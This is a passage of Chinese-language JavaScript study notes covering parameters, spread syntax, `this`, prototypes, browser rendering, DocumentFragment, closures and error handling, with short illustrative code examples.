multiply(a, b) {\n  return a * b;\n}\n\nmultiply(5, 2); // 10\nmultiply(5);    // NaN !\n```\n\n为了防止这种情况，第二行代码解决了这个问题，其中如果只使用一个参数调用multiply，则b设置为1：\n```js\nfunction multiply(a, b) {\n  b = (typeof b !== 'undefined') ?  b : 1;\n  return a * b;\n}\n\nmultiply(5, 2); // 10\nmultiply(5);    // 5\n```\n有了默认参数，我们不需要再在函数体内做不必要的检查。现在你可以在函数头将b的默认值置为1：\n```js\nfunction multiply(a, b = 1) {\n  return a * b;\n}\n\nmultiply(5, 2); // 10\nmultiply(5);    // 5\n```\n### 调用时解析\n在函数被调用时，参数默认值会被解析，所以不像Python中的例子，每次函数调用时都会创建一个新的参数对象。\n```js\nfunction append(value, array = []) {\n  array.push(value);\n  return array;\n}\n\nappend(1); //[1]\nappend(2); //[2], not [1, 2]\n```\n\n这个规则对于函数和变量也是适用的。\n```js\nfunction callSomething(thing = something()) {\n return thing;\n}\n\nlet numberOfTimesCalled = 0;\nfunction something() {\n  numberOfTimesCalled += 1;\n  return numberOfTimesCalled;\n}\n\ncallSomething(); // 1\ncallSomething(); // 2\n```\n### 默认参数可用于后面的默认参数\n已经遇到的参数可用于以后的默认参数：\n```js\nfunction greet(name, greeting, message = greeting + ' ' + name) {\n    return [name, greeting, message];\n}\n\ngreet('David', 'Hi');  // [\"David\", \"Hi\", \"Hi David\"]\ngreet('David', 'Hi', 'Happy Birthday!');  // [\"David\", \"Hi\", \"Happy Birthday!\"]\n```\n\n### 位于默认参数之后非默认参数\n在Gecko 26 (Firefox 26 / Thunderbird 26 / SeaMonkey 2.23 / Firefox OS 1.2)之前，以下代码会造成SyntaxError错误。这已经在bug 1022967中修复，并在以后的版本中按预期方式工作。参数仍然设置为从左到右，覆盖默认参数，即使后面的参数没有默认值。\n```js\nfunction f(x = 1, y) {\n  return [x, y];\n}\n\nf(); // [1, undefined]\nf(2); // [2, undefined]\n```\n\n### 有默认值的解构参数\n你可以通过解构赋值为参数赋值：\n```js\nfunction f([x, y] = [1, 2], {z: z} = {z: 3}) {\n  return x + y + z;\n}\n\nf(); // 6\n```\n\n## 剩余参数\n```js\nfunction sum(...theArgs) {\n  return theArgs.reduce((previous, current) => {\n    return previous + current;\n  });\n}\n\nconsole.log(sum(1, 2, 3));\n// expected output: 6\n\nconsole.log(sum(1, 2, 3, 4));\n// expected output: 10\n```\n### 描述\n如果函数的最后一个命名参数以`...`为前缀，则它将成为一个由剩余参数组成的真数组，其中从0（包括）到theArgs.length（排除）的元素由传递给函数的实际参数提供。\n在上面的例子中，theArgs将收集该函数的第三个参数（因为第一个参数被映射到a，而第二个参数映射到b）和所有后续参数。\n\n### 剩余参数和 arguments对象的区别\n剩余参数和 arguments对象之间的区别主要有三个：\n- 剩余参数只包含那些没有对应形参的实参，而 arguments 对象包含了传给函数的所有实参。\n- arguments对象不是一个真正的数组，而剩余参数是真正的 Array实例，也就是说你能够在它上面直接使用所有的数组方法，比如 sort，map，forEach或pop。\n- arguments对象还有一些附加的属性 （如callee属性）。\n\n### 解构剩余参数\n剩余参数可以被解构，这意味着他们的数据可以被解包到不同的变量中。\n```js\nfunction f(...[a, b, c]) {\n  return a + b + c;\n}\n\nf(1)          // NaN (b and c are undefined)\nf(1, 2, 3)    // 6\nf(1, 2, 3, 4) // 6 (the fourth parameter is not destructured)\n```\n\n### 示例\n因为theArgs是个数组，所以你可以使用length属性得到剩余参数的个数：\n```js\nfunction fun1(...theArgs) {\n  alert(theArgs.length);\n}\n\nfun1();  // 弹出 \"0\", 因为theArgs没有元素\nfun1(5); // 弹出 \"1\", 因为theArgs只有一个元素\nfun1(5, 6, 7); // 弹出 \"3\", 因为theArgs有三个元素\n```\n下例中，剩余参数包含了从第二个到最后的所有实参，然后用第一个实参依次乘以它们：\n```js\nfunction multiply(multiplier, ...theArgs) {\n  return theArgs.map(function (element) {\n    return multiplier * element;\n  });\n}\n\nvar arr = multiply(2, 1, 2, 3);\nconsole.log(arr);  // [2, 4, 6]\n```\n\n# 展开语法\n展开语法(Spread syntax), 可以在函数调用/数组构造时, 将数组表达式或者string在语法层面展开；还可以在构造字面量对象时, 将对象表达式按key-value的方式展开。(译者注: 字面量一般指 [1, 2, 3] 或者 {name: \"mdn\"} 这种简洁的构造方式)\n```js\nfunction sum(x, y, z) {\n  return x + y + z;\n}\n\nconst numbers = [1, 2, 3];\n\nconsole.log(sum(...numbers));\n// expected output: 6\n\nconsole.log(sum.apply(null, numbers));\n// expected output: 6\n```\n## 语法\n函数调用：\n```js\nmyFunction(...iterableObj);\n```\n字面量数组构造或字符串：\n```js\n[...iterableObj, '4', ...'hello', 6];\n```\n构造字面量对象时,进行克隆或者属性拷贝（ECMAScript 2018规范新增特性）：\n```js\nlet objClone = { ...obj };\n```\n## 在函数调用时使用展开语法\n**等价于apply的方式**\n如果想将数组元素迭代为函数参数，一般使用Function.prototype.apply 的方式进行调用。\n```js\nfunction myFunction(x, y, z) { }\nvar args = [0, 1, 2];\nmyFunction.apply(null, args);\n```\n有了展开语法，可以这样写：\n```js\nfunction myFunction(x, y, z) { }\nvar args = [0, 1, 2];\nmyFunction(...args);\n```\n所有参数都可以通过展开语法来传值，也不限制多次使用展开语法。\n```js\nfunction myFunction(v, w, x, y, z) { }\nvar args = [0, 1];\nmyFunction(-1, ...args, 2, ...[3]);\n```\n\n## 在 new 表达式中应用\n使用 new 关键字来调用构造函数时，不能直接使用数组+ apply 的方式（apply 执行的是调用 [[Call]] , 而不是构造 [[Construct]]）。当然, 有了展开语法, 将数组展开为构造函数的参数就很简单了：\n```js\nvar dateFields = [1970, 0, 1]; // 1970年1月1日\nvar d = new Date(...dateFields);\n```\n\n## 构造字面量数组时更给力！\n没有展开语法的时候，只能组合使用 push, splice, concat 等方法，来将已有数组元素变成新数组的一部分。有了展开语法,  通过字面量方式, 构造新数组会变得更简单、更优雅：\n```js\nvar parts = ['shoulders', 'knees'];\nvar lyrics = ['head', ...parts, 'and', 'toes']; \n// [\"head\", \"shoulders\", \"knees\", \"and\", \"toes\"]\n```\n和参数列表的展开类似, `...`在构造字面量数组时, 可以在任意位置多次使用.\n\n## 数组拷贝(copy)\n```js\nvar arr = [1, 2, 3];\nvar arr2 = [...arr]; // like arr.slice()\narr2.push(4);\n\n// arr2 此时变成 [1, 2, 3, 4]\n// arr 不受影响\n```\n提示: 实际上, 展开语法和 Object.assign() 行为一致, 执行的都是浅拷贝(只遍历一层)。如果想对多维数组进行深拷贝, 下面的示例就有些问题了。\n```js\nvar a = [[1], [2], [3]];\nvar b = [...a];\nb.shift().shift(); // 1\n// Now array a is affected as well: [[2], [3]]\n```\n\n## 连接多个数组\nArray.concat 函数常用于将一个数组连接到另一个数组的后面。如果不使用展开语法, 代码可能是下面这样的:\n```js\nvar arr1 = [0, 1, 2];\nvar arr2 = [3, 4, 5];\n// 将 arr2 中所有元素附加到 arr1 后面并返回\nvar arr3 = arr1.concat(arr2);\n```\n使用展开语法:\n```js\nvar arr1 = [0, 1, 2];\nvar arr2 = [3, 4, 5];\nvar arr3 = [...arr1, ...arr2];\n```\nArray.unshift 方法常用于在数组的开头插入新元素/数组.  不使用展开语法, 示例如下:\n```js\nvar arr1 = [0, 1, 2];\nvar arr2 = [3, 4, 5];\n// 将 arr2 中的元素插入到 arr1 的开头\nArray.prototype.unshift.apply(arr1, arr2) // arr1 现在是 [3, 4, 5, 0, 1, 2]\n```\n如果使用展开语法, 代码如下:  [请注意, 这里使用展开语法创建了一个新的 arr1 数组,  Array.unshift 方法则是修改了原本存在的 arr1 数组]:\n```js\nvar arr1 = [0, 1, 2];\nvar arr2 = [3, 4, 5];\narr1 = [...arr2, ...arr1]; // arr1 现在为 [3, 4, 5, 0, 1, 2]\n```\n\n## 构造字面量对象时使用展开语法\nRest/Spread Properties for ECMAScript 提议(stage 4) 对 字面量对象 增加了展开特性。其行为是, 将已有对象的所有可枚举(enumerable)属性拷贝到新构造的对象中.\n\n浅拷贝(Shallow-cloning, 不包含 prototype) 和对象合并, 可以使用更简短的展开语法。而不必再使用 Object.assign() 方式.\n```js\nvar obj1 = { foo: 'bar', x: 42 };\nvar obj2 = { foo: 'baz', y: 13 };\n\nvar clonedObj = { ...obj1 };\n// 克隆后的对象: { foo: \"bar\", x: 42 }\n\nvar mergedObj = { ...obj1, ...obj2 };\n// 合并后的对象: { foo: \"baz\", x: 42, y: 13 }\n```\n提示: Object.assign() 函数会触发 setters，而展开语法则不会。\n\n## 只能用于可迭代对象\n在数组或函数参数中使用展开语法时, 该语法只能用于可迭代对象：\n```js\nvar obj = {'key1': 'value1'};\nvar array = [...obj]; // TypeError: obj is not iterable\n```\n\n## 与剩余参数的区别\n剩余语法(Rest syntax) 看起来和展开语法完全相同，不同点在于, 剩余参数用于解构数组和对象。从某种意义上说，剩余语法与展开语法是相反的：展开语法将数组展开为其中的各个元素，而剩余语法则是将多个元素收集起来并“凝聚”为单个元素\n\n# Lambda表达式(箭头函数)\njs中的Lambda表达式就可以看作是一个匿名函数声明方式，可以随意地使用，不像java那样，只有在实现一个函数接口时候才能使用Lambda表达式\n**箭头函数中的this, arguments问题**\n首先箭头函数其实是没有`this`, `arguments`的，箭头函数中的`this`与`arguments`只取决于包裹箭头函数的第一个普通函数的`this`的`arguments`。在下面例子中，因为包裹箭头函数的第一个普通函数是a，所以此时的`this`是`window`，`arguments`是普通函数a中的`arguments`。\n```js\nwindow.num = 1\nfunction a() {\n  return () => {\n    return () => {\n      console.log(this.num)//window\n      console.log(arguments.length) \n      return 123\n    }\n  }\n}\nconsole.log(a(1,1)()())//123\n```\n输出：\n```\n1\n2\n123\n```\n\n\n# this的指向\n\n使用 JavaScript 开发的时候，很多开发者多多少少会被 this 的指向搞蒙圈，但是实际上，关于 this 的指向，记住最核心的一句话：**函数里的this总是指向调用该函数的对象。**\n\n## 浏览器环境下this普通函数指向\n最外层的对象就是windows。我们在最外层调用test()函数，所以test()的this也是win，故输出“win”。\n```js\n//在浏览器执行\nwindow.name = 'win'\nfunction test(){\n    console.log(this.name); //输出“win”\n}\ntest();\n```\n并且最外层的this就是windows \n```js\n//在浏览器执行\nconsole.log(this === window); //输出“ture”\n```\n所以我们可以写这样一个代码：\n```js\n//在浏览器执行\nthis.name = 'win' //这种写法与windows.name=win等价\n \nconsole.log(this === window); //输出“ture”\n \nfunction test(){\n    console.log(window === this); //输出“true”\n    console.log(this.name); //输出“win”\n}\ntest();\n```\n好了，以上就是在浏览器中函数指向this简谈。\n\n## node环境下this普通函数指向\n看懂上边里的例子，我们会认为node只是把全局的的名字window换成了global。\n\n并且看起来也是这样：\n```js\n//在node环境执行\nglobal.name = 'node.js'\nfunction test(){\n    console.log(this.name); //输出“node.js”\n}\ntest();\n```\n可是，这不代表node中仅仅是把全局对象改名为global这么简单！\n\n看下边这个例子：\n```js\n//在node中执行\nthis.name = 'win' \n \nconsole.log(this === global); //输出\"false”\n \nfunction test(){\n    console.log(this === global); //输出“true”\n    console.log(this.name); //输出“undefined”\n}\ntest();\n```\n也就是说，在最外层this不等于global，但是test函数的this依旧指向global。\n\n这是因为在最外层的this并不是全局对象global。而是`module.exports`\n\n关于`module.export`具体定义可以查看相关文章，这是es6的新特性。\n```js\nconsole.log(module.exports === this); //输出“true”\n``` \n\n总结：node中最外层this不等于全局作用域global。而且在最外层调用函数，将会使得函数指向global。\n\n# 函数中this关键字与arguments关键字\n<font color=\"red\">解析器在调用函数时，每次都会向函数内部传递一个隐含的参数this与arguments, this指向调用这个方法的对象</font>\n\n**arguments对象**\narguments是一个类数组对象(一个类似于数组但不是数组的对象)，它可以通过索引来操作数据，也可以获取长度，在调用函数时，我们所传递的实参(注意：不是形参)都会在arguments中报存，我们可以通过`arguments[i]`的方式来获取第i个实参 \n\narguments常用方法:`arguments.length`, `arguments.callee`\n\n# js中没有方法重载\njs中是没有方法重载的，只有覆盖\n```js\nfunction test(a){\n  console.log(\"test1....\");\n}\nfunction test(){\n  console.log(\"test....\");\n}\ntest(1);//输出：test...\n```\n```js\nfunction test(){\n  console.log(\"test....\");\n}\nfunction test(a){\n  console.log(\"test1....\");\n}\ntest(1);//输出：test1...\n```\n但是由于arguments属性的存在，我们可以模拟重载，如下：\n```js\nfunction add(num1, num2){\n  if(arguments.length == 1){\n    alert(\"你输入的只有一个数字:\"+arguments[0]+\" 请重新输入\");\n  }else if(arguments.length == 2){\n    alert(\"你输入数字的和为：\" + arguments[0]+arguments[1]);\n  }\n}\n```\n\n**注：js调用函数时传入的参数个数与函数定义时的参数个数不符时的操作**\nECMAScript函数的参数与大多数其他语言中的函数的参数有所不同。<font color=\"red\">ECMAScript函数不介意传递进来多少个参数，也不在乎穿进来参数是什么数据类型</font>。也就是是说，即便你定义的函数值接受两个参数，在调用这个函数时也未必一定要是两个参数。可以传递一个、三个甚至不传递参数，而解析器永远不会有什么怨言。之所以会这样，原因是ECMAScript中的参数在内部是用一个数组来运行的。函数接受到的永远是这个数组，而不关心数组中包含哪些参数(如果有参数的话)。如果这个数组中不包含任何元素，无所谓；如果包含多个元素，也没问题。实际上，在函数体内可以通过arguments对象来访问这个参数数组，从而获取传递给含糊的每一个参数。\n\n# 原型对象\n- 每创建一个函数，解析器都会向函数中添加一个属性`prototype`，这个属性对应着一个对象，这个对象就是原型对象。\n- 当函数以构造函数的形式调用时，它所创建的对象都会有一个隐含的属性`__proto__`, 这个属性指向构造函数的原型对象\n- 原型对象也一个隐含属性`__prote__`, 同样也是指向它的原型对象\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409110054.png)\n\n原型对象的作用：相当于一个公共的区域，所有同一个类的实例都可以访问到这个原型对象，所以我们可以将对象中共有的内容，放到原型对象中\n下面是用实例阐述了原型对象的作用\n```js\nfunction Person(name){\n  this.name = name;\n  this.sayName = function(){\n    alert(this.name);\n  };\n}\nvar obj4 = new Person(\"whz\");\n```\n这样的话，每创建一个Person对象，都会在堆中创建一个sayName方法对象，这样做的效率太低了\n做如下改进：\n```js\nfunction Person(name){\n  this.name = name;\n  this.sayName = say;\n}\nvar say = function(){\n  alert(this.name);\n};\n\nvar obj4 = new Person(\"whz\");\n```\n这样的话，解决了上述的开辟多个sayName方法对象的问题，但是这样做的话，要创建一个全局变量，在开发中，是十分不推荐随意创建全局变量的\n做如下改进：\n```java\nfunction Person(name){\n  this.name = name;\n  this.sayName = say;\n}\nPerson.prototype.sayName = function(){\n  alert(this.name);\n}\nvar obj4 = new Person(\"whz\");\n```\n使用原型对象的方式就很好的解决了上述所有问题\n\n# call()和apply()\ncall()、apply()都是来修改this的指向。\n\n- 这两个方法都是函数对象的方法，需要通过函数对象来调用，从而调用函数执行\n- 在调用call()和apply()时，可以将一个对象作为该方法的第一个参数，此时这个对象就会成为该函数执行时的this所指向的对象 \n- call和apply用法基本相同，只是传参的方式不同而已，call是一个一个的传值， apply则传入一个数组；\n  - call()可以将参数放在第一个参数后一次传递，例如`fun.call(obj, 2, 3);`\n  - apply()需要将参数封装到一个数组中传递，例如`fun.call(obj,[2, 3]);`\n\n\n\n# 访问一个属性的过程\n当访问对象中的一个属性或方法时，它会先在对象自身中寻找，再到该对象的原型对象中寻找，再到该对象的原型对象的原型对象中寻找，直到找到Object对象，Object对象没有原型对象，如果再Object中还没有找到，则返回undefined\n\n# 浏览器加载HTML页面的顺序\n首先我们可以把浏览器加载页面的工作分给`渲染引擎`和`javascript引擎`\n浏览器在解析页面时，是**从上到下的**，我们来看下面这个结构：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409110104.png)\n\n**浏览器加载顺序：**\n1. 解析到head标签内的内部样式表①，渲染引擎加载样式表中的样式，下载引用到的图片，下载等工作可以跟渲染同时进行。\n2. 向服务器请求链如样式表②，然后渲染引擎加载样式表中的样式。\n3. 下载链入js③，浏览器将控制权交给js引擎，js引擎解释执行。\n4. 遇到script标签，将控制权交给js引擎，从上到下，js引擎解释执行。\n5. 加载完head标签后，继续向下解析，执行到内部js⑤，js引擎解释执行。\n6. 加载完body中的标签，之后再将控制权交给js引擎，js引擎解释执行内部js⑥。\n7. 遇到html结束标签，加载完毕，将构建好的DOM树和计算好的样式整合构成渲染树（render树），在浏览器窗口中画出。\n\n**js文件和script标签的加载**\n在解析到链入js文件或者script标签时。浏览器会阻塞其它下载，即无法并行解析和下载，在请求js文件时，浏览器会一直等待返回结果并解析完成之后才会继续向下执行。\n重点：建议将script标签放在body的最后，因为js文件很有可能会修改DOM树和引用DOM元素，为了不让js文件解析执行时找不到要引用的DOM元素和DOM树被反复修改而带来的性能问题，所以最好将script标签放在body的最后，或者可以在js代码放在window.onload中，意思是等页面全部加载完之后再加载这些js代码。\n\n# 页面渲染的过程\n## 页面渲染是客户端请求页面的最后一步\n- DNS解析域名\n- TCP建立连接\n- HTTP发送请求\n- 服务器返回状态码及相应数据\n- 浏览器解析渲染页面\n\n## 渲染引擎\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409110114.png)\n\n从图中可以看出，一个渲染引擎大致包括HTML解释器、CSS解释器、布局和JavaScript引擎。\n- `HTML解释器`：解释HTML语言的解释器，本质是将HTML文本解释成DOM树（文档对象模型）。\n- `CSS解释器`：解释样式表的解释器，其作用是将DOM中的各个元素对象加上样式信息，从而为计算最后结果的布局提供依据。\n- `布局`：将DOM和css样式信息结合起来，计算它们的大小位置等布局信息，形成一个能够表示这所有信息的内部表示模型即渲染树。\n- `JavaScript引擎`：JavaScript可以修改网页的内容，也能修改CSS的信息，JavaScript引擎解释JavaScript代码并把代码的逻辑和对DOM和CSS的改动信息应用到布局中去，从而改变渲染的结果。\n\n## 页面渲染\n浏览器加载，解析，渲染页面\n解析html 构建dom树 -> 构建render树 -> 布局render树 -> 绘制render树 ：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409110125.png)\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409110206.png)\n\n我们知道浏览器为了体验友好，并不是文档全部都解析才绘制到屏幕上，而是从上至下开始解析html，遇到css 会开启线程下载css；\n解析：\n- 浏览器会将HTML解析成一个DOM树（Document Object Model 文档对象模型），DOM树的构建过程是一个深度遍历过程，当前节点的所有子节点都构建好后才会去构建当前节点的下一个兄弟节点，\n- 将CSS解析成CSS规则树（或CSSOM树，CSS Object Model CSS对象模型）；\n- 构建：根据DOM树和CSS来构造render树，渲染树不等于DOM树，像header和display：none；这种没有具体内容的东西就不在渲染树中；\n- 布局：根据render树，浏览器可以计算出网页中有哪些节点，各节点的CSS以及从属关系，然后可以计算出每个节点在屏幕中的位置；\n- 绘制：遍历render树进行绘制页面中的各元素。\n\n### Reflow（重排）\n渲染对象在创建完成并添加到渲染树时，并不包含位置和大小信息。计算这些值的过程称为`布局`或`重排`。\n\n**当改变影响到文本内容或结构，或者元素位置时**，重排或者说重新布局就会发生。这些改变通常由以下事件触发：\n- DOM操作（元素添加、删除、修改或者元素顺序的改变）；\n- 内容变化，包括表单域内的文本改变；\n- CSS属性的计算或改变；\n- 添加或删除样式表；\n- 更改“类”的属性；\n- 浏览器窗口的操作（缩放，滚动）；\n- 伪类激活（悬停）。\n\n### Repaint(重绘)\n重绘是改变不影响元素在网页中的位置的元素样式时，譬如background-color(背景色)， border-color(边框色)， visibility(可见性)，浏览器会根据元素的新属性重新绘制一次(这就是重绘，或者说重新构造样式)，使元素呈现新的外观。**重绘不会带来重新布局，所以并不一定伴随重排。**\n\n\n\"重绘\"不一定需要\"重排\"，比如改变某个网页元素的颜色，就只会触发\"重绘\"，不会触发\"重排\"，因为布局没有改变。但是，\"重排\"必然导致\"重绘\"，比如改变一个网页元素的位置，就会同时触发\"重排\"和\"重绘\"，因为布局改变了。\n\n## 浏览器如何优化渲染？\n- 将多次改变样式属性的操作合并成一次操作\n- 将需要多次重排的元素，position属性设为absolute或fixed，\n这样此元素就脱离了文档流，它的变化不会影响到其他元素。例如有动画效果的元素就最好设置为绝对定位。\n- 由于display属性为none的元素不在渲染树中，对隐藏的元素操作不会引发其他元素的重排。\n如果要对一个元素进行复杂的操作时，可以先隐藏它，操作完成后再显示。这样只在隐藏和显示时触发2次重排。\n- 如果在解析html的时候遇到js会阻塞页面渲染，所以一般将script标签放到页面底部，也就是body闭合标签之前，这能确保在脚本执行前页面已经完成了DOM树渲染\n- 尽可能地合并脚本。页面中的script标签越少，加载也就越快，响应也越迅速。无论是外链脚本还是内嵌脚本都是如此\n- 不要一条一条地修改 DOM 的样式。与其这样，还不如预先定义好 css 的 class，然后修改 DOM 的 className\n- 千万不要使用 table 布局。因为可能很小的一个小改动会造成整个 table 的重新布局\n\n# createDocumentFragment()与createElement()\n1.createDocumentFragment()方法，是用来创建一个虚拟的节点对象，或者说，是用来创建文档碎片节点。它可以包含各种类型的节点，在创建之初是空的。\n\n2.DocumentFragment节点不属于文档树，继承的parentNode属性总是null。它有一个很实用的特点，当请求把一个DocumentFragment节点插入文档树时，插入的不是DocumentFragment自身，而是它的所有子孙节点，即插入的是括号里的节点。这个特性使得DocumentFragment成了占位符，暂时存放那些一次插入文档的节点。它还有利于实现文档的剪切、复制和粘贴操作。 \n\n另外，当需要添加多个dom元素时，如果先将这些元素添加到DocumentFragment中，再统一将DocumentFragment添加到页面，会减少页面渲染dom的次数，效率会明显提升。\n\n3.如果使用appendChid方法将原dom树中的节点添加到DocumentFragment中时，会删除原来的节点。 \n\n4.createDocumentFragment()方法和createElement()方法的区别：\n(1)需要很多的插入操作和改动，继续使用类似于下面的代码则会很有问题\n```js\nvar ul = document.getElementById(\"ul\");\nfor (var i = 0; i < 20; i++) {\n    var li = document.createElement(\"li\");\n    li.innerHTML = \"index: \" + i;\n    ul.appendChild(li);\n}\n```\n由于每一次对文档的插入都会引起重新渲染（计算元素的尺寸，显示背景，内容等），所以进行多次插入操作使得浏览器发生了很多次渲染，效率是比较低的。这是我们提倡通过减少页面的渲染来提高DOM操作的效率的原因。一个优化的方法是将要创建的元素写到一个字符串上，然后一次性写到innerHTML上，这种利用浏览器对innerHTML的解析确实是相比上面的多次插入快了很多。但是构造字符串灵活性上面比较差，很难符合创建各种各样的DOM元素的需求。利用DocumentFragment，可以弥补这两个方法的不足。\n\n因为文档片段存在于内存中，并不在DOM中，所以将子元素插入到文档片段中时不会引起页面回流（对元素位置和几何上的计算），因此使用DocumentFragment可以起到性能优化的作用。例如上面的代码就可以改成下面的片段。\n```js\nvar ul = document.getElementById(\"ul\");\nvar fragment = document.createDocumentFragment();\nfor (var i = 0; i < 20; i++) {\n    var li = document.createElement(\"li\");\n    li.innerHTML = \"index: \" + i;\n    fragment.appendChild(li);\n}\nul.appendChild(fragment);\n```\n(2)createElement创建的元素可以使用innerHTML，createDocumentFragment创建的元素使用innerHTML并不能达到预期修改文档内容的效果，只是作为一个属性而已。两者的节点类型完全不同，createElement创建的是元素节点，节点类型为1，createDocumentFragment创建的是文档碎片，节点类型是11。并且createDocumentFragment创建的元素在文档中没有对应的标记，因此在页面上只能用js中访问到。\n```js\n<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\"\n        \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\">\n<html>\n<head>\n    <meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\"/>\n    <title></title>\n    <style type=\"text/css\">\n        #outer{ height: 200px; border: 1px solid #006400;}\n    </style>\n</head>\n<body>\n<div id=\"outer\">\n</div>\n<input type=\"button\" value=\"createElement\" id=\"btn_1\"/><input type=\"button\" value=\"createDocumentFragment\" id=\"btn_2\"/>\n<script type=\"text/javascript\">\nvar fragment_1 = document.createDocumentFragment();\n        fragment_1.innerHTML = '<p>我是一个粉刷匠</p>';\n        document.body.appendChild(fragment_1);\n    var fragment_2 = document.createElement('p');\n        fragment_2.innerHTML = '粉刷本领强';\n        document.body.appendChild(fragment_2);\n</script>\n</body>\n</html>\n```\n\n(3)createElement创建的元素可以重复操作，添加之后就算从文档里面移除依旧归文档所有，可以继续操作，但是createDocumentFragment创建的元素是一次性的，添加之后再就不能操作了（说明：这里的添加并不是添加了新创建的片段，因为上面说过，新创建的片段在文档内是没有对应的标签的，这里添加的是片段的所有子节点）。\n```html\n<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\"\n        \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\">\n<html>\n<head>\n    <meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\"/>\n    <title></title>\n    <style type=\"text/css\">\n        #outer{ height: 200px; border: 1px solid #006400;}\n    </style>\n</head>\n<body>\n<div id=\"outer\">\n</div>\n<input type=\"button\" value=\"createElement\" id=\"btn_1\"/><input type=\"button\" value=\"createDocumentFragment\" id=\"btn_2\"/>\n<script type=\"text/javascript\">\n    function $(id){\n        return document.getElementById(id);\n    }\n    var outer = $('outer');\n    var inner = $('inner'); \n    $('btn_1').onclick = function(){\n        var div = document.createElement('div');\n            div.innerHTML = '<p>测试createElement</p>';\n        document.body.appendChild(div);\n        setTimeout(function(){\n            outer.appendChild(div);\n            setTimeout(function(){\n                outer.removeChild(div);\n            },1000)\n        },1000)\n    }\n    $('btn_2').onclick = function(){\n        var p = document.createElement('p');\n            p.innerHTML = '测试DocumentFragment';\n        var fragment = document.createDocumentFragment();\n            fragment.appendChild(p);\n            fragment.innerHTML = '<p>测试DocumentFragment</p>';\n            fragment.innerHTML = '<span>测试DocumentFragment</span>';\n        document.body.appendChild(fragment);\n        setTimeout(function(){\n            outer.appendChild(fragment);//报错，因为此时文档内部已经能够不存在fragment了\n            setTimeout(function(){\n                outer.removeChild(fragment);\n            },1000)\n        },1000)\n    }\n</script>\n</body>\n</html>\n```\n(4)通过createElement新建元素必须指定元素tagName,因为其可用innerHTML添加子元素。通过createDocumentFragment则不必。\n\n(5)通过createElement创建的元素插入文档后，还可以取到创建时的返回值，即上面例子中createElement还是创建的那个div元素，而createDocumentFragment创建的元素插入到文档后，就不能访问创建时的返回值了，相当于把自己创建的文档片段直接挪到文档中了。\n\n5.createDocumentFragment()方法和createElement()方法的共同点：\n\n(1)添加子元素后返回值都是新添加的子元素，因此，可通过下面的方法利用innerHTML为createDocumentFragment添加子元素：\n```js\nvar fragment = document.createDocumentFragment();\nvar ret = fragment.appendChild(document.createElement('div'));\nret.innerHTML = 'by innerHTML ';\ntest1.appendChild(fragment);\n```\n(2)都可以通过appendChild添加子元素，且子元素必须是node类型，不能为文本。\n\n(3)若添加的子元素是文档中存在的元素，则通过appendChild在为其添加子元素时，会从文档中删除之前存在的元素。\n\n6.DocumentFragment是没有父节点的最小的文档对象，用于存储HTML和XML片段。DocumentFragment对象继承Node，所以它有Node的所有属性方法，完全可以操作Node(NodeList)那样操作DocumentFragment。此外W3C对DocumentFragment也定义了一些另外的属性和方法，但是由于多数浏览器都没有实现，从兼容性上来说不推荐使用这些属性。具体有哪些属性方法可以参考MDN说明。\n\n创建DocumentFragment的方法有两种，document.createDocumentFragment()和new Fragment()。对于document.createDocumentFragment()，所有浏览器都支持（包括IE6），而构造函数方法就不是所有浏览器都有效了（IE没有实现该方法）。所以从兼容性上来说推荐使用document.createDocumentFragment()。\n\n# 闭包\n当一个嵌套的内部(子)函数引用了嵌套的外部(父)函数的变量或函数时，就产生了闭包。\n闭包可以理解为是嵌套的内部函数。\n\n**闭包产生的两个条件：**\n- 函数嵌套\n- 内部函数引用了外部函数的数据(变量/函数)\n注：满足上面的两个条件后，执行内部函数的定义就能产生闭包，而无需调用内部函数\n```js\nfunction fn1(){\n  var a = 2\n  var b = 'abc'\n  function fn2(){ \n    console.log(a)\n  }\n  return fn2\n}\n```\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409110219.png)\n\n**闭包的作用**\n- 使函数内部的变量在函数执行完后，仍然存活在内存中(延迟了局部变量的生命周期)\n- 让外部能够操作(读写)到函数内部的数据(变量/函数)\n**闭包的生命周期**\n产生：在嵌套内部函数定义执行(函数声明提升)时就产生了,不是在调用时产生\n死亡：在嵌套内部函数成为垃圾对象时，即没有引用指向嵌套内部函数时\n```js\nfunction fn1(){\n  //此时闭包就产生了，因为函数提升\n  var a = 2\n  var b = 'abc'\n  function fn2(){ \n    a++\n    console.log(a)\n  }\n  return fn2\n}\nvar f = fn1()\nf(); //输出：3\nf(); //输出：4\nf = null // 闭包死亡（因为没有引用指向嵌套内部函数）\n```\n\n**闭包的引用：自定义js模块**\n```js\n(function(){\n  var msg = \"whz\"\n  function doSomething(){\n    console.log('doSomething()'+msg.toUpperCase())\n  }\n  function doOthering(){\n    console.log('doOtherthing()'+msg.toLowerCase())\n  }\n\n  //向外暴露嵌套内部函数\n  window.myMoudle2 = {\n    doSomething: doSomething,\n    doOtherthing: doOtherthing\n  }\n})()\n\nmyMoudle2.doSomething()\nmyMoudle2.doOtherthing()\n```\n\n# js的错误处理\njs的错误类型：\n- Error：是所有错误类型的父类型\n- ReferenceError: 引用的变量不存在的错误\n- TypeError: 数据类型不正确的错误\n- RangeError: 数据值不在其所允许的范围内\n- SyntaxError: 语法错误\n\n**错误处理**\n- 捕获错误：try...catch\n```js\ntry{\n  let d\n  console.log(d.name)\n}catch(error){\n  console.log(error.message)\n  console.log(error.stack)\n}\n```\n- 抛出错误：throw error\n```js\nif(Date.now()%2 === 1){\n  console.log('执行任务')\n}else{\n  throw new Error('错误');\n}\n```\n\n# 解构赋值\n[解构赋值](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Operators/Destructuring_assignment)\n\n基本语法\n```js\nvar a, b, rest;\n[a, b] = [10, 20];\nconsole.log(a); // 10\nconsole.log(b); // 20\n\n[a, b, ...rest] = [10, 20, 30, 40, 50];\nconsole.log(a); // 10\nconsole.log(b); // 20\nconsole.log(rest); // 